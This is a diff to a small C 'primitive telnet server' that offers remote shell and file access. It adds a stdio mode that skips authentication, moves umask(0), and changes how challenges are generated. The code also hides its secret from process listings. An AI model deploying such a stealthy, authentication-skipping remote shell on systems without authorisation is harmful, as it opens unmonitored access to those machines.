@@ -20,6 +20,12 @@
 
 // usage: tn port id64.secret64.port4 -- primitive telnet server
 
+// this program was written to be as small as possible, without
+// completely sacrificing performance, and provide a network
+// efficient protocol at the same time. error checking is
+// moved into the kernel as much as possible, and a number of
+// space saving but rather dirty tricks are being used.
+
 //      1 -- start shell
 //      2 path -- open rdonly
 //      3 path -- open wrcreat
@@ -85,9 +91,17 @@
 // ver 16
 // "unlimited" (~8k) packet length (packet length 255 chains to next)
 // accept no longer accepts multiple message packets
-// minor space optimisation
+// minor size optimisations
 
-#define VERSION "16"
+// ver 17
+// increase number of distinct challenges when urandom is missing
+// exit child on 0 packet, do not enter accept loop
+
+// ver 18
+// implement a "stdio" slave mode (when started with three arguments)
+// a socket is expected as stdin/stdout, authentication is skipped
+
+#define VERSION "18"
 
 #include <errno.h>
 #include <unistd.h>
@@ -255,6 +269,9 @@ int main(int argc, char *argv[])
                 eargv[2] = argv[1];
                 execve(argv[0], eargv, environ);
         }
+
+        syscall(SCN(SYS_umask), 0000);
+
         // copy id + challenge-response secret from commandline.
         // also space out commandline secret, to be less obvious.
         // some ps versions unfortunately show the spaces.
@@ -268,7 +285,8 @@ int main(int argc, char *argv[])
                         argv[2][i] = ' ';
         }
 
-        syscall(SCN(SYS_umask), 0000);
+        if (argc == 4)
+                goto handle_client;     // I did not know this would even be possible - but it sure saves space
 
         int ls = tcp_socket();
 
@@ -308,10 +326,8 @@ int main(int argc, char *argv[])
                         read(i, secret, 32);
                         close(i);
 
-                        ++secret[0];
-
-                        for (i = 0; i < 31; ++i)
-                                secret[i + 1] += secret[i];
+                        // if urandom is not available, "increment" challenge
+                        ++((uint32_t *) secret)[0];
                 }
 
                 int fd = accept(0, 0, 0);
@@ -338,6 +354,9 @@ int main(int argc, char *argv[])
 
                         if (memcmp(buffer, buffer + 33, 32))
                                 x();
+
+ handle_client:
+                        fd = 3; // for stdio mode
 
                         wpkt(MSG(VERSION "/" arch));    /* version/arch */
                         static const uint32_t endian = 0x11223344;
@@ -594,6 +613,8 @@ int main(int argc, char *argv[])
                                   default:
                                           x();
                                 }
+
+                        x();
                 }
                 // keep fd open for at least 1s, also delay hack attempts
                 sleep_ms(1000);
